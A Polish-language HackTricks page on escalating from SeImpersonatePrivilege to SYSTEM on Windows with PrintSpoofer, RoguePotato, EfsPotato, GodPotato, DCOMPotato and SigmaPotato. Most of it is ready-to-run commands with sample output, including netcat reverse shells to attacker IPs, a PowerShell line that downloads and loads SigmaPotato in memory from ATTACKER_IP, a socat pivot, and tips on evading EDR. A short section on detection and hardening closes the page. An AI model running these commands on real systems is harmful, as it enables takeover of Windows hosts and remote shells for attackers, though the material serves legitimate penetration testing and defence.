# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato nie działa** na Windows Server 2019 i Windows 10 build 1809 oraz nowszych. Jednak [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** można użyć do **uzyskania tych samych uprawnień i osiągnięcia poziomu dostępu `NT AUTHORITY\SYSTEM`**. Ten [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) szczegółowo opisuje narzędzie `PrintSpoofer`, które można wykorzystać do nadużycia uprawnień impersonacji na hostach Windows 10 i Server 2019, gdzie JuicyPotato już nie działa.

> [!TIP]
> Nowoczesną alternatywą często utrzymywaną w latach 2024–2025 jest SigmaPotato (fork GodPotato), która dodaje in-memory/.NET reflection usage oraz rozszerzone wsparcie dla systemów operacyjnych. Zobacz szybkie użycie poniżej oraz repozytorium w sekcji References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Wymagania i częste pułapki

Wszystkie poniższe techniki polegają na nadużyciu uprzywilejowanej usługi zdolnej do impersonacji z kontekstu posiadającego jedno z następujących uprawnień:

- SeImpersonatePrivilege (najczęstsze) lub SeAssignPrimaryTokenPrivilege
- Wysoki poziom uprawnień (high integrity) nie jest wymagany, jeśli token już posiada SeImpersonatePrivilege (typowe dla wielu kont usługowych, takich jak IIS AppPool, MSSQL itp.)

Szybko sprawdź uprawnienia:
```cmd
whoami /priv | findstr /i impersonate
```
Uwagi operacyjne:

- PrintSpoofer wymaga, aby usługa Print Spooler była uruchomiona i osiągalna przez lokalny punkt końcowy RPC (spoolss). W utwardzonych środowiskach, gdzie Spooler jest wyłączony po PrintNightmare, preferuj RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato wymaga OXID resolvera osiągalnego na TCP/135. Jeśli egress jest zablokowany, użyj redirectora/port-forwardera (zobacz przykład poniżej). Starsze wersje wymagały flagi -f.
- EfsPotato/SharpEfsPotato wykorzystują MS-EFSR; jeśli jeden pipe jest zablokowany, wypróbuj alternatywne pipe'y (lsarpc, efsrpc, samr, lsass, netlogon).
- Błąd 0x6d3 podczas RpcBindingSetAuthInfo zazwyczaj wskazuje na nieznaną/nieobsługiwaną usługę uwierzytelniania RPC; spróbuj innej pipe/transportu lub upewnij się, że docelowa usługa jest uruchomiona.

## Szybkie demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notatki:
- Możesz użyć -i, aby uruchomić proces interaktywny w bieżącej konsoli, lub -c, aby wykonać jednowierszowe polecenie.
- Wymaga usługi Spooler. Jeśli jest wyłączona, operacja się nie powiedzie.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Jeśli ruch wychodzący na 135 jest zablokowany, pivot OXID resolver przez socat na swoim redirectorze:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Porada: Jeśli jeden pipe zawiedzie lub EDR go zablokuje, spróbuj innych obsługiwanych pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notatki:
- Działa na Windows 8/8.1–11 oraz Server 2012–2022, gdy obecne jest SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato udostępnia dwie wersje celujące w obiekty DCOM usług, które domyślnie mają ustawiony RPC_C_IMP_LEVEL_IMPERSONATE. Skompiluj lub użyj dostarczonych binaries i uruchom swoje polecenie:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (zaktualizowany fork GodPotato)

SigmaPotato dodaje nowoczesne udogodnienia, takie jak in-memory execution za pomocą .NET reflection oraz PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Notatki dotyczące wykrywania i zabezpieczeń

- Monitoruj procesy tworzące named pipes i natychmiast wywołujące API duplikujące tokeny, a następnie CreateProcessAsUser/CreateProcessWithTokenW. Sysmon może ujawnić przydatną telemetrię: Event ID 1 (tworzenie procesu), 17/18 (named pipe utworzony/podłączony) oraz linie poleceń uruchamiające procesy potomne jako SYSTEM.
- Wzmocnienie Spoolera: Wyłączenie usługi Print Spooler na serwerach, gdzie nie jest potrzebna, zapobiega lokalnym wymuszeniom w stylu PrintSpoofer poprzez spoolss.
- Wzmocnienie kont usługowych: Minimalizuj przydzielanie SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege niestandardowym usługom. Rozważ uruchamianie usług pod kontami wirtualnymi z minimalnymi niezbędnymi uprawnieniami oraz izolowanie ich za pomocą service SID i write-restricted tokens, jeśli to możliwe.
- Kontrole sieciowe: Blokowanie ruchu wychodzącego TCP/135 lub ograniczanie ruchu RPC endpoint mapper może złamać RoguePotato, chyba że dostępny jest wewnętrzny redirector.
- EDR/AV: Wszystkie te narzędzia są szeroko sygnaturowane. Rekomplilacja ze źródeł, zmiana nazw symboli/łańcuchów lub wykonywanie w pamięci może zmniejszyć wykrywalność, ale nie pokona solidnych detekcji behawioralnych.

## Źródła

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

{{#include ../../banners/hacktricks-training.md}}
